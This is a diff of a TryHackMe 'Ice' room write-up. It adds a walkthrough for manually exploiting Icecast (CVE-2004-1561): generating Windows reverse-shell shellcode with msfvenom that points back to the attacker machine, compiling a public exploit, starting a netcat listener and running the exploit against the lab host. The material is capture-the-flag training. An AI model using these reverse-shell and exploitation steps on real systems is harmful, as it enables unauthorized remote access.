@@ -296,10 +296,43 @@ In this optional task we can try to exploit the vulnerability manually with the 
 
 1. As you advance in your pentesting skills, you will be faced eventually with exploitation without the usage of Metasploit. Provided above is the link to one of the exploits found on Exploit DB for hijacking Icecast for remote code execution. While not required by the room, it's recommended to attempt exploitation via the provided code or via another similar exploit to further hone your skills.
 
-```cmd
-msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=10.18.78.136 LPORT=443 -b '\x0a\x0d\x00' -f c
-gcc 574.c -o 575                                                                            
-chmod +x 575
-nc -nlvp 443
-./575 10.10.170.150
-```
+   After doing some research I found script that could work here. https://github.com/ivanitlearning/CVE-2004-1561
+   
+   The first thing we need to do after downloading the file is to modify the shellcode to suit our situation. Luckily, the author supplied us the steps to do so. LHOST should be our attack machine and LPORT the listening port.
+
+   ```cmd
+   msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=10.18.78.136 LPORT=443 -b '\x0a\x0d\x00' -f c
+   ```
+   
+   ![Shellcode](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/ice/Extra_Shellcode.png)
+   
+   The resulting code snipper can be copied into our script.
+   
+   ![Script](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/ice/Extra_Script.png)
+   
+   Now that we have our finished script, we must compile it using `gcc`. After that, we should make the script executable with `chmod`.
+   
+   ```cmd
+   gcc 574.c -o 575
+   chmod +x 575
+   ```
+   
+   ![Compile](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/ice/Extra_Compile.png)
+   
+   The last last to take before executing the script is to set up a listener on the specified port using `netcat`.
+   
+   ```cmd
+   nc -nlvp 443
+   ```
+   
+   Now we can run the script with the following command and wait for the incoming shell:
+   
+   ```cmd
+   ./575 10.10.170.150
+   ```
+   
+   ![Run Script](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/ice/Extra_Run_Script.png)
+   
+   ![Access](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/ice/Extra_Access.png)
+
+I will leave the escalation part for another time. For now I feel like I have done enough. The mentioned youtube video also goes through the steps to ecsalte your priveleges.
